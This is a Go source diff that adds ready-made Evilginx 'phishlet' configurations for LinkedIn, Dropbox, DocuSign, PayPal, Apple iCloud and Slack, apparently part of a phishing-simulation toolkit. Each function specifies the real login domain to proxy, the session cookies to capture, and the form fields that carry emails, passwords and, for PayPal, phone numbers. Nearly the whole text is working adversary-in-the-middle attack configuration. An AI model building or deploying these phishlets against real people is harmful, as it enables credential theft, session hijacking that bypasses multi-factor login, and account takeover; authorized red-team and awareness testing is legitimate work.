@@ -241,6 +241,313 @@ func StripePhishlet() *PhishletConfig {
 	}
 }
 
+// LinkedInPhishlet returns a pre-configured LinkedIn phishlet
+func LinkedInPhishlet() *PhishletConfig {
+	return &PhishletConfig{
+		Name:       "linkedin",
+		Author:     "gophish-labs",
+		MinVersion: "2.3.0",
+		ProxyHosts: []ProxyHost{
+			{
+				PhishSub:  "www",
+				OrigSub:   "www",
+				Domain:    "linkedin.com",
+				Session:   true,
+				IsLanding: true,
+			},
+		},
+		SubFilters: []SubFilter{
+			{
+				TriggerDomains: []string{"www.linkedin.com"},
+				OrigSub:        "www",
+				Domain:         "linkedin.com",
+				Search:         "www.linkedin.com",
+				Replace:        "{domain}",
+				Mimes:          []string{"text/html", "application/json"},
+			},
+		},
+		AuthTokens: []AuthToken{
+			{
+				Domain: ".linkedin.com",
+				Keys:   []string{"li_at", "JSESSIONID", "liap"},
+				Type:   "cookie",
+			},
+		},
+		Credentials: CredentialConfig{
+			Username: CredentialField{
+				Key:    "email",
+				Search: "session_key",
+				Type:   "post",
+			},
+			Password: CredentialField{
+				Key:    "password",
+				Search: "session_password",
+				Type:   "post",
+			},
+		},
+		LoginURL:  "/",
+		ForcePost: false,
+	}
+}
+
+// DropboxPhishlet returns a pre-configured Dropbox phishlet
+func DropboxPhishlet() *PhishletConfig {
+	return &PhishletConfig{
+		Name:       "dropbox",
+		Author:     "gophish-labs",
+		MinVersion: "2.3.0",
+		ProxyHosts: []ProxyHost{
+			{
+				PhishSub:  "www",
+				OrigSub:   "www",
+				Domain:    "dropbox.com",
+				Session:   true,
+				IsLanding: true,
+			},
+		},
+		SubFilters: []SubFilter{
+			{
+				TriggerDomains: []string{"www.dropbox.com"},
+				OrigSub:        "www",
+				Domain:         "dropbox.com",
+				Search:         "www.dropbox.com",
+				Replace:        "{domain}",
+				Mimes:          []string{"text/html", "application/json"},
+			},
+		},
+		AuthTokens: []AuthToken{
+			{
+				Domain: ".dropbox.com",
+				Keys:   []string{"t", "gvc"},
+				Type:   "cookie",
+			},
+		},
+		Credentials: CredentialConfig{
+			Username: CredentialField{
+				Key:    "email",
+				Search: "login_email",
+				Type:   "post",
+			},
+			Password: CredentialField{
+				Key:    "password",
+				Search: "login_password",
+				Type:   "post",
+			},
+		},
+		LoginURL:  "/login",
+		ForcePost: false,
+	}
+}
+
+// DocuSignPhishlet returns a pre-configured DocuSign phishlet
+func DocuSignPhishlet() *PhishletConfig {
+	return &PhishletConfig{
+		Name:       "docusign",
+		Author:     "gophish-labs",
+		MinVersion: "2.3.0",
+		ProxyHosts: []ProxyHost{
+			{
+				PhishSub:  "account",
+				OrigSub:   "account",
+				Domain:    "docusign.com",
+				Session:   true,
+				IsLanding: true,
+			},
+		},
+		SubFilters: []SubFilter{
+			{
+				TriggerDomains: []string{"account.docusign.com"},
+				OrigSub:        "account",
+				Domain:         "docusign.com",
+				Search:         "account.docusign.com",
+				Replace:        "{domain}",
+				Mimes:          []string{"text/html", "application/json"},
+			},
+		},
+		AuthTokens: []AuthToken{
+			{
+				Domain: ".docusign.com",
+				Keys:   []string{"DocuSignSessionDomain", "JSESSIONID"},
+				Type:   "cookie",
+			},
+		},
+		Credentials: CredentialConfig{
+			Username: CredentialField{
+				Key:    "email",
+				Search: "email",
+				Type:   "post",
+			},
+			Password: CredentialField{
+				Key:    "password",
+				Search: "password",
+				Type:   "post",
+			},
+		},
+		LoginURL:  "/",
+		ForcePost: false,
+	}
+}
+
+// PayPalPhishlet returns a pre-configured PayPal phishlet
+func PayPalPhishlet() *PhishletConfig {
+	return &PhishletConfig{
+		Name:       "paypal",
+		Author:     "gophish-labs",
+		MinVersion: "2.3.0",
+		ProxyHosts: []ProxyHost{
+			{
+				PhishSub:  "www",
+				OrigSub:   "www",
+				Domain:    "paypal.com",
+				Session:   true,
+				IsLanding: true,
+			},
+		},
+		SubFilters: []SubFilter{
+			{
+				TriggerDomains: []string{"www.paypal.com"},
+				OrigSub:        "www",
+				Domain:         "paypal.com",
+				Search:         "www.paypal.com",
+				Replace:        "{domain}",
+				Mimes:          []string{"text/html", "application/json"},
+			},
+		},
+		AuthTokens: []AuthToken{
+			{
+				Domain: ".paypal.com",
+				Keys:   []string{"cookie_prefs", "tsrce", "ts_c", "x-pp-s"},
+				Type:   "cookie",
+			},
+		},
+		Credentials: CredentialConfig{
+			Username: CredentialField{
+				Key:    "email",
+				Search: "login_email",
+				Type:   "post",
+			},
+			Password: CredentialField{
+				Key:    "password",
+				Search: "login_password",
+				Type:   "post",
+			},
+			Custom: []CredentialField{
+				{
+					Key:    "phone",
+					Search: "phone",
+					Type:   "post",
+				},
+			},
+		},
+		LoginURL:  "/signin",
+		ForcePost: false,
+	}
+}
+
+// ApplePhishlet returns a pre-configured Apple iCloud phishlet
+func ApplePhishlet() *PhishletConfig {
+	return &PhishletConfig{
+		Name:       "apple",
+		Author:     "gophish-labs",
+		MinVersion: "2.3.0",
+		ProxyHosts: []ProxyHost{
+			{
+				PhishSub:  "idmsa",
+				OrigSub:   "idmsa",
+				Domain:    "apple.com",
+				Session:   true,
+				IsLanding: true,
+			},
+			{
+				PhishSub: "www",
+				OrigSub:  "www",
+				Domain:   "icloud.com",
+				Session:  true,
+			},
+		},
+		SubFilters: []SubFilter{
+			{
+				TriggerDomains: []string{"idmsa.apple.com"},
+				OrigSub:        "idmsa",
+				Domain:         "apple.com",
+				Search:         "idmsa.apple.com",
+				Replace:        "{domain}",
+				Mimes:          []string{"text/html", "application/json"},
+			},
+		},
+		AuthTokens: []AuthToken{
+			{
+				Domain: ".apple.com",
+				Keys:   []string{"myacinfo", "aasp"},
+				Type:   "cookie",
+			},
+		},
+		Credentials: CredentialConfig{
+			Username: CredentialField{
+				Key:    "email",
+				Search: "accountName",
+				Type:   "post",
+			},
+			Password: CredentialField{
+				Key:    "password",
+				Search: "password",
+				Type:   "post",
+			},
+		},
+		LoginURL:  "/",
+		ForcePost: false,
+	}
+}
+
+// SlackPhishlet returns a pre-configured Slack phishlet
+func SlackPhishlet() *PhishletConfig {
+	return &PhishletConfig{
+		Name:       "slack",
+		Author:     "gophish-labs",
+		MinVersion: "2.3.0",
+		ProxyHosts: []ProxyHost{
+			{
+				PhishSub:  "{subdomain}",
+				OrigSub:   "{subdomain}",
+				Domain:    "slack.com",
+				Session:   true,
+				IsLanding: true,
+			},
+		},
+		SubFilters: []SubFilter{
+			{
+				TriggerDomains: []string{"{subdomain}.slack.com"},
+				OrigSub:        "{subdomain}",
+				Domain:         "slack.com",
+				Search:         "{subdomain}.slack.com",
+				Replace:        "{domain}",
+				Mimes:          []string{"text/html", "application/json"},
+			},
+		},
+		AuthTokens: []AuthToken{
+			{
+				Domain: ".slack.com",
+				Keys:   []string{"d", "d-s"},
+				Type:   "cookie",
+			},
+		},
+		Credentials: CredentialConfig{
+			Username: CredentialField{
+				Key:    "email",
+				Search: "email",
+				Type:   "post",
+			},
+			Password: CredentialField{
+				Key:    "password",
+				Search: "password",
+				Type:   "post",
+			},
+		},
+		LoginURL:  "/",
+		ForcePost: false,
+	}
+}
+
 // GeneratePhishletYAML generates YAML configuration for Evilginx
 func (pc *PhishletConfig) GeneratePhishletYAML() string {
 	yaml := fmt.Sprintf("name: %s\n", pc.Name)
